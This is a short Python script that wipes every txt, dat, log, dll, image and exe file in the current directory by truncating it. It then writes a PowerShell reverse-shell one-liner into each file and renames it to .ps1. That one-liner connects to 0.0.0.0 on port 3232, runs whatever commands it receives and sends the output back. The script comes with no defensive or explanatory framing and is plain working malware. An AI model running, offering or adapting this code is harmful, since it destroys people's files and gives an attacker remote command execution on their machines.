import os
import glob

current_directory = os.getcwd()

file_extensions = ["txt", "dat", "log", "dll", "png", "jpg", "jpeg", "exe"]  # Add or remove extensions as needed

file_paths = []
for ext in file_extensions:
    file_paths.extend(glob.glob(os.path.join(current_directory, f"*.{ext}")))

for file_path in file_paths:
    with open(file_path, 'r+') as file:
        file.truncate(0)
        file.seek(0, 2)
        file.write("powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('0.0.0.0',3232);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")

    new_file_path = os.path.splitext(file_path)[0] + ".ps1"
    os.rename(file_path, new_file_path)